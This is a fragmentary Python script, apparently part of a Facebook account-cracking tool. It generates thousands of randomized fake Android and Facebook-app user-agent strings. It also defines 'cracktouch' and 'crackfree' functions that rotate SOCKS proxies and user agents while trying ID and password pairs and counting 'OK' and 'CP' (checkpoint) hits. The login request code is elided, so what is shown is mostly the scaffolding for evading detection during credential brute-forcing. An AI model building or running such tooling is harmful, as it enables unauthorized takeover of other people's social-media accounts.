...
for xd in range(5000):
	...
	c=' Nokia 8 Sirocco Build/QKQ1.190828.002; wv)'
...
for x in range(9999):
	rr = random.randint
	models = random.choice(["TECNO KC3","moto g 5G plus","Redmi Note 7 Pro","PCHM10","Nokia C31","Nokia C1 2nd Edition"])
	...
	us = f"Mozilla/5.0 (Linux; Android {android}; {models} Build/SKQ1.220201.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/{str(rr(100,1000))}.0.0.{str(rr(1,50))}.{str(rr(1000,900000))};]"
	ugen.append(us)
	
for x in range(9999):
	android = random.choice(['7.1.2','8.1.0','8.00','9.0','10','5.0'])
	...
	h2 = f"Mozilla/5.0 (Linux; U; Android {android}; {models} Build/{build}.H1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 OPR/{browser}"
	ugen.append(h2)
	
for x in range(9999):
	rr = random.randint
	rc = random.choice
	xx = random.choice(['U; ru','U; en','U; id','U; ar','U; es','U; cs','U; sr','U; pl','U; sw','U; fa','U; hi','U; it'])
	opera = random.randint(5,70)
	mini = random.randint(240,310)
	vv = random.randint(2250,40000)
	cc = random.randint(0,9)
	ua = f"Opera/9.80 (Android; Opera Mini/{opera}.{cc}.{vv}/191.{mini}; {xx}) Presto/2.12.423 Version/12.16"
	ugen.append(ua)
...
for x in range(9999):
	...
	ua1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,15))}; {models}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(76,115))}.0.{str(rr(5500,5900))}.{str(rr(75,200))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(8,13))}.{str(rr(10,40))}.{str(rr(1,9))}-{z}"
	ugen.append(ua1)
...
def cracktouch(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r[TOUCH] {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
	sys.stdout.flush()
	nip=random.choice(prox)
	proxs= {'http': 'socks4://'+nip}
	ua = random.choice(ugen)
...
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r[GRAPH] {P}{b}{loop}{P}/{u}{len(id)}{P} OK {P}{H}{ok}{P} CP {P}{k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "), 
	sys.stdout.flush()
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugen)
